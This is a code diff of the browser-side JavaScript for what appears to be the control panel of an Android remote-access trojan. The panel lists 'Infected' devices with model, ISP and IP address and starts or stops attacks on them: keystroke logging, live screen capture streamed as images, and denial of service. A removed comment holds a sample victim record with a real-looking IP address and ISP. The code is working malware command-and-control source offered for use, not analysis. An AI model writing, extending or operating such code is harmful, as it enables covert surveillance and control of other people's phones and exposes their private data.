@@ -1,41 +1,32 @@
 const infected = document.getElementById("infected")
 const infos = document.getElementById("infos")
+const form = document.getElementById("left")
+const imgSrc = document.querySelector("#imgSrc img")
+const androidScreen = document.getElementById("imgSrc")
 let CurrentDevice = ""
 let CurrentAttack = ""
-let devices = {}
 
 
 
-// let devices = JSON.parse("{\"rgOU2a84CnPwXmp7AAAF\":{\"Country\":\"India\",\"ISP\":\"Reliance Jio Infocomm Limited\",\"IP\":\"49.36.217.95\",\"Brand\":\"Redmi\",\"Model\":\"M2006C3MII\",\"Manufacture\":\"Xiaomi\"},\"Xs-nnilxK574IBPrAAAH\":{\"Country\":\"India\",\"ISP\":\"Reliance Jio Infocomm Limited\",\"IP\":\"49.36.217.95\",\"Brand\":\"google\",\"Model\":\"AOSP on IA Emulator\",\"Manufacture\":\"Google\"}}" ) 
-
-// for(var i in devices){
-//     infected.insertAdjacentHTML("beforeend",`<option onclick="fetchInfo('${i}')" value="${i}">${devices[i]['Brand']} (${devices[i]['Model']})</option>`) 
-// devices[i] = devices[i]
-// }
+/* Clearing */
+form.reset()
+infos.innerHTML = ""
 
 
 
-function fetchInfo(id){
-    stopAttack()
-    CurrentDevice = id
-    tmp = ""
-    for(i in devices[id]){
-        tmp += `<div class="info">
-        <span>${i} :</span>
-        <span>${devices[id][i]}</span>
-    </div>` 
-    }
-    infos.innerHTML = tmp
-}
+
 
 function stopAttack(){
     // STOPING CURRENT ATTACK
-    if(CurrentAttack != "" || CurrentDevice != ""){
+    if(CurrentAttack != ""){
         msgSend(CurrentDevice,CurrentAttack,"stop")
         ele = document.querySelector('input[name="attack"]:checked')
         if(ele != null){
             ele.checked = false
         }
+        CurrentAttack = ""
+
+        // console.log(CurrentAttack,ele)
     }
 }
 
@@ -57,15 +48,33 @@ function DOS(val){
 }
 
 
-function attack(ack){
-    switch (ack) {
-        case "Logger":
-            CurrentAttack = "logger"
-            msgSend(CurrentDevice,"logger","start")
-            break;
-        
-        default:
-            break;
+async function getInfo(id){
+    await stopAttack()
+    if(id != "None"){
+        $.ajax({
+            url : document.location.origin+'/info',
+            method : 'POST',
+            type : 'POST',
+            data : {
+                id : id,
+            },
+            success : async (data)=>{
+                // console.log(data)
+                await stopAttack()
+                CurrentDevice = id
+                tmp = ""
+                delete data['ID']
+                for(i in data){
+                    tmp += `<div class="info">
+                    <span>${i} :</span>
+                    <span>${data[i]}</span>
+                </div>` 
+                }
+                infos.innerHTML = tmp
+            }
+        })
+    }else{
+        infos.innerHTML = ""
     }
 }
 
@@ -82,31 +91,26 @@ function attack(ack){
 
 
 /** Making Socket Connections */
-const socket = io(`http://${document.location.hostname}:4000/`,{ query: "user=admin" })
+const socket = io(`ws://${document.location.hostname}:4001/`,{transports: ['websocket'], upgrade: false})
 const output = document.getElementById("output")
 
-
-// socket.on("admin",(data)=>{
-//     console.log(data)
-//     output.append(data+"\n")
-// })
-
 socket.on("logger",(data)=>{
-    console.log(data)
+    // console.log(data)
     output.append(data+"\n")
+    output.scrollTo(0,output.scrollTopMax) 
+})
+
+socket.on("img",(data)=>{
+    imgSrc.src = "data:image/jpeg;charset=utf-8;base64,"+data 
 })
 
 socket.on("info",(data)=>{
-    // data = JSON.parse(data)
     // console.log(data)
     infected.innerHTML = '<option data-display="Infected">None</option>'
     data.forEach(i=>{
-        infected.insertAdjacentHTML("beforeend",`<option onclick="fetchInfo('${i[0]}')" value="${i[0]}">${i[1]} (${i[2]})</option>`) 
+        infected.insertAdjacentHTML("beforeend",`<option value="${i[0]}">${i[1]} (${i[2]})</option>`) 
     })
-    // devices[id] = data
 })
-
-socket.on("")
 
 
 /** Making Socket Connections */
@@ -115,7 +119,6 @@ socket.on("")
 
 /** Functions */
 function msgSend(id,emit,...args){
-    // console.log(args)
     $.ajax({
         url : document.location.origin+'/send',
         method : 'POST',
@@ -131,6 +134,81 @@ function msgSend(id,emit,...args){
     })
 }
 
+// Function for selecting only one check box in a group
+$('input[type="checkbox"]').on('change', async function() {
+    if(this.checked){
+        $('input[name="' + this.name + '"]').not(this).prop('checked', false);
+    }
+
+    console.log(this)
+    if(CurrentAttack == "screen"){
+        androidScreen.style.opacity = "0"
+        androidScreen.style.pointerEvents = "none"
+        rightBG.style.opacity = "1"
+        output.style.opacity = "1"
+    }
+
+    await stopAttack()
+    
+
+    CurrentAttack = this.value
+
+    if(this.checked && CurrentAttack == "screen"){
+        androidScreen.style.opacity = "1"
+        androidScreen.style.pointerEvents = "all"
+        rightBG.style.opacity = "0"
+        output.style.opacity = "0"
+    }
+
+
+    // console.log(CurrentDevice,this.value,"start")
+    if(this.checked){
+        msgSend(CurrentDevice,this.value,"start")
+    }else{
+        CurrentAttack = ""
+    }
+    
+});
+
+
+
+// function toggleAndroidScreen(bool){
+    
+// }
+
+
 // $(document).ready(function(){
 //     $('select').niceSelect()
+// })
+
+
+
+// function mail(mEmail,mSub,mBody) {
+//     mSub = encodeURI(mSub)
+//     mBody = encodeURI(mBody+` ${window.location.href}`)
+//     window.location.href = `mailto:${mEmail}?subject=${mSub}&body=${mBody}`
+// }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// async function l1(){
+//     return await setTimeout(()=>{
+//         console.log("a")
+//     },1000)
+// }
+
+// l1().then(()=>{
+
+//     console.log("b")
 // })
